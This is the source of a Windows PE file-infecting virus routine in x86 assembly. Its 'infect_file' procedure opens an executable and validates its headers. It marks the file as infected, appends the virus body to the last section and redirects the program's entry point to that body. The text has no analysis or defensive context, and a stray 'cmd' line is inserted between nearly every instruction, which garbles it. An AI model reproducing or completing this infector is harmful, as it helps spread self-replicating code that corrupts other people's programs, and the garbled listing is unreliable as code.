   ; file infecting subroutine. REDUCED to be as simple as possible.

   ; input: EDX=file name

   cmd
   infect_file             proc    pascal
                           local   mz:BYTE:size mz_struc
                           local   oe:BYTE:size oe_struc
                           local   pe:BYTE:size pe_struc
                           local   last_oe_offs
                           pusha
   cmd
                           seh_init
   cmd

                           lea     esi, pe
   cmd
                           lea     edi, oe
   cmd

                           call    fopen_rw
   cmd
                           jc      __exit
   cmd
                           xchg    ebx, eax
   cmd

                           lea     edx, mz
   cmd
                           mov     ecx, size mz_struc
   cmd
                           call    fread
   cmd
                           cmp     eax, ecx
   cmd
                           jne     __close

   cmd
                           cmp     [edx].mz_id, 'ZM'
   cmd
                           jne     __close

   cmd
                           mov     edx, mz.mz_neptr
   cmd
                           call    fseek

   cmd
                           mov     edx, esi
   cmd
                           mov     ecx, size pe_struc
   cmd
                           call    fread
   cmd
                           cmp     eax, ecx
   cmd
                           jne     __close

   cmd
                           cmp     [esi].pe_id, 'EP'
   cmd
                           jne     __close

   cmd
                           test    [esi].pe_exeflags, 2000h ; dll?
   cmd
                           jnz     __close
   cmd
                           or      [esi].pe_exeflags, 0001h ; strip relocs

   cmd
                           cmp     [esi].pe_entrypointrva, 0
   cmd
                           je      __close

   cmd
                           cmp     [esi].pe_linkminor, 'Z' ; alredy processed?
   cmd
                           je      __close
   cmd
                           mov     [esi].pe_linkminor, 'Z'

   cmd
                           xor     eax, eax
   cmd
                           mov     [esi].pe_checksum, eax
   cmd
                           mov     [esi].pe_fixuptablerva, eax
   cmd
                           mov     [esi].pe_fixuptablesize, eax

   cmd
                           movzx   ecx, [esi].pe_numofobjects
   cmd
                           dec     ecx
   cmd
                           imul    ecx, size oe_struc
   cmd
                           mov     edx, mz.mz_neptr
   cmd
                           add     edx, pe_ntheader_id-pe_id
   cmd
                           movzx   eax, [esi].pe_ntheadersize
   cmd
                           add     edx, eax
   cmd
                           add     edx, ecx
   cmd
                           mov     last_oe_offs, edx
   cmd
                           call    fseek

   cmd
                           mov     edx, edi
   cmd
                           mov     ecx, size oe_struc
   cmd
                           call    fread

   cmd
                           xor     eax, eax
   cmd
                           cmp     [edi].oe_virt_size, eax
   cmd
                           je      __close
   cmd
                           cmp     [edi].oe_phys_size, eax
   cmd
                           je      __close

   cmd
                           mov     ecx, [esi].pe_filealign
   cmd
                           dec     ecx
   cmd
                           add     [edi].oe_phys_size, ecx
   cmd
                           not     ecx
   cmd
                           and     [edi].oe_phys_size, ecx

   cmd
                           mov     ecx, [esi].pe_objectalign
   cmd
                           dec     ecx
   cmd
                           add     [edi].oe_virt_size, ecx
   cmd
                           not     ecx
   cmd
                           and     [edi].oe_virt_size, ecx

   cmd
                           mov     edx, [edi].oe_phys_offs
   cmd
                           add     edx, [edi].oe_phys_size
   cmd
                           call    fseek

   cmd
                           mov     eax, [edi].oe_virt_rva
   cmd
                           add     eax, [edi].oe_phys_size
   cmd
                           add     eax, [esi].pe_imagebase
   cmd
                           mov     patch_start, eax

   cmd
                           mov     eax, [esi].pe_entrypointrva
   cmd
                           add     eax, [esi].pe_imagebase
   cmd
                           mov     patch_eip, eax

   cmd
                           call    gen_copy
   cmd
                           jc      __close

   cmd
                           mov     eax, [edi].oe_phys_size
   cmd
                           add     eax, [edi].oe_virt_rva
   cmd
                           add     eax, init-start ; offset buf_entry
   cmd
                           mov     [esi].pe_entrypointrva, eax
   cmd
                           mov     eax, CODESIZE ; buf_size
   cmd
                           add     [edi].oe_phys_size, eax
   cmd
                           add     [edi].oe_virt_size, eax
   cmd
                           add     [esi].pe_sizeofcode, eax
   cmd
                           add     [esi].pe_imagesize, eax
   cmd
                           mov     ecx, CODESIZE ; buf_size
   cmd
                           lea     edx, buf      ; buf_ptr
   cmd
                           call    fwrite
   cmd
                           jc      __close
   cmd

   cmd
                           mov     edx, mz.mz_neptr
   cmd
                           call    fseek
   cmd

   cmd
                           mov     edx, esi
   cmd
                           mov     ecx, size pe_struc
   cmd
                           call    fwrite
   cmd
                           jc      __close

   cmd
                           mov     edx, last_oe_offs
   cmd
                           call    fseek

   cmd
                           mov     edx, edi
   cmd
                           mov     ecx, size oe_struc
   cmd
                           call    fwrite
   cmd

   __close:                call    fclose

   cmd
   __exit:                 seh_done

   cmd
                           popa
   cmd
                           ret
   cmd

                           endp    ; infect_file
   cmd
